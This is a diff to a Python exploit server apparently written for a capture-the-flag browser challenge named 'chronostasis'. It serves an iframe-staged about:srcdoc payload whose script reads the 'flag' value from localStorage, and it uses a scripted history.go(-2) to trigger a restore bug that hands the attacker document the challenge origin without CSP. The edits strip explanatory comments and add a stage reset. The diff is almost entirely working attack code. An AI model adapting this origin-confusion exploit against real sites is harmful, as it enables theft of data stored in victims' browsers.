@@ -15,9 +15,6 @@ def cu(content):
     return CHAL + '/?content=' + urllib.parse.quote(content, safe='')
 
 def payload():
-    # First committed as a no-CSP attacker-origin about:srcdoc document.
-    # The vulnerable restore later gives it the current challenge parent origin
-    # while retaining this historical no-CSP policy container.
     return '''<!doctype html><meta charset=utf-8><script>
 const __f = localStorage.getItem('flag');
 console.log('[chronostasis] EXEC origin='+location.origin+' href='+location.href+' hist='+history.length+' flag='+__f);
@@ -62,8 +59,10 @@ class H(BaseHTTPRequestHandler):
         if q.get('t',[''])[0] != TOKEN:
             self.html('bad token',403); return
         if u.path=='/start':
+            with lock:
+                stage_count = 0
             initial=cu('<iframe name="m" src="'+html.escape(au('/stage'),quote=True)+'"></iframe>')
-            print('[+] start ->', initial, flush=True)
+            print('[+] start/reset ->', initial, flush=True)
             self.sendb(302, headers={'Location':initial}); return
         if u.path=='/stage':
             with lock:
@@ -78,8 +77,7 @@ class H(BaseHTTPRequestHandler):
         if u.path=='/dummy':
             self.html('<!doctype html><meta charset=utf-8>dummy'); return
         if u.path=='/back':
-            # Joint history is: srcdoc payload -> /dummy -> /back. One back only
-            # lands on /dummy and stalls. Jump two entries directly to srcdoc.
+            # Joint child history observed live is srcdoc -> dummy -> back.
             self.html("<!doctype html><meta charset=utf-8><script>console.log('[chronostasis] BACK hist='+history.length);setTimeout(()=>history.go(-2),150)</script>")
             return
         if u.path=='/status': self.html('ok'); return
